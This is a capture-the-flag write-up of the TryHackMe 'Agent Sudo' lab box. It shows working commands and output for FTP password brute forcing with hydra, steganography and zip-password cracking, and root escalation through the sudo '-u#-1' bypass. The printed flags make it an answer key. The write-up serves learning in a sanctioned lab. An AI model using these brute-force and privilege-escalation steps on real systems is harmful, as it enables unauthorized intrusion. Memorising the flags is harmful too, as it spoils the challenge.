# Agent Sudo Writeup
#pentest/tryhackme

Visiting the webpage, seems like we have to find an agent codename and specify it in the user agent header. 
We know an **Agent R** exists, so that might be a lead.

Let’s do some recon:

```shell
$ nmap -sV 10.10.185.219
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

and

```shell
$ python3 dirsearch.py -u 10.10.185.219 --extensions-list
...
[09:57:33] 200 -  218B  - /index.php                                                                              
[09:57:34] 200 -  218B  - /index.php/login/
```

So the only real useful thing is knowing that:
1. We have an open port serving FTP
2. We have an Agent R

Can we generate a list of potential codenames and use Burp Intruder? Let’s give it a shot.

```ruby
irb(main):002:0> File.open('codenames.txt', 'w') { |f| ('a'..'z').each { |c| f.puts(c) }; ('A'..'Z').each { |c| f.puts(c) }; ('0'..'9').each { |c| f.puts(c) } }
```

Seems like an `Agent C` exists and the response points to a file called `agent_C_attention.php` After accessing it we get:

```
Attention chris, 

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! 

From,
Agent R 
```

So we now know that:
1. Agent C, J and R exists
2. We might have an username: `chris`

Can we brute force the FTP? Let’s attempt to `hydra` it!

```shell
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.185.219
...
[21][ftp] host: 10.10.185.219   login: chris   password: crystal
```

Progress!

```shell
$ ftp 10.10.185.219
Connected to 10.10.185.219.
220 (vsFTPd 3.0.3)
Name (10.10.185.219:kali): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command.
ftp: bind: Address already in use
```

After some research on how to enumerate files and download then:

```shell
ftp> pass
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,185,219,149,235).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
227 Entering Passive Mode (10,10,185,219,188,72).
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (3.8324 MB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
227 Entering Passive Mode (10,10,185,219,185,178).
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.28 secs (117.1373 kB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
227 Entering Passive Mode (10,10,185,219,248,194).
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.24 secs (139.1136 kB/s)
ftp> exit
```

Let’s investigate:

```shell
$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Some steganography fun! How can we extract this information?

```shell
$ apt-get install steghide
$ steghide info cute-alien.jpg 
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Hmmm… what about using `extract`?

```shell
$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Same problem… what about the other file?  `cutie.png`
In firefox: `file:///home/kali/local_server/cutie.png`, and it’s actually just a cute alien. 🤔

Can we use `foremost` to infer file types and other headers?

```shell
$ apt-get install foremost
$ foremost -i cutie.png 
Processing: cutie.png
|foundat=To_agentR.txt�
*|
```

Interestingly enough this generated an `output` folder with the following:

```shell
$ ls output/
audit.txt  png  zip
kali@kali:~/local_server$ ls output/zip/
00000067.zip
kali@kali:~/local_server$ ls output/png/
00000000.png
```

So now we have a zip file, can we extract it?

```shell
$ unzip output/zip/00000067.zip 
Archive:  output/zip/00000067.zip
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)

$ 7z x output/zip/00000067.zip 
...
Enter password (will not be echoed):
```

Guess we still need a password. Can we crack it?

```shell
$ sudo zip2john output/zip/00000067.zip > output.txt
$ john --format=zip output.txt
...
alien            (00000067.zip/To_agentR.txt)
```

Nice! 

```shell
$ 7z x output/zip/00000067.zip 
Enter password (will not be echoed):
Everything is Ok 
cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

base64, maybe? [CyberChef](https://gchq.github.io/CyberChef/) can answer and the answer is YES! 

```shell
$ echo QXJlYTUx | base64 -d
Area51
$ steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
kali@kali:~/local_server$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

$ ssh @james10.10.185.219
hackerrules!

Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$
```

Time to fetch the image and inspect it: 

```shell
$ scp james@10.10.185.219:Alien_autospy.jpg .
james@10.10.185.219's password: 
Alien_autospy.jpg   
```

And now we can do a reverse search by image using google: [Google Images](https://www.google.com/imghp?hl=en)
And the answer is: `Roswell alien autopsy`

Time for privilege escalation!

```shell
$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

What is the `ALL, !root` stuff? Seems pretty inconsistent. 🤔 Let’s google it! 
Interesting: [sudo 1.8.27 - Security Bypass - Linux local Exploit](https://www.exploit-db.com/exploits/47502)

```shell
$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Looks like we are vulnerable! 

```shell
$james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# ls /root/
root.txt
root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

Bingo!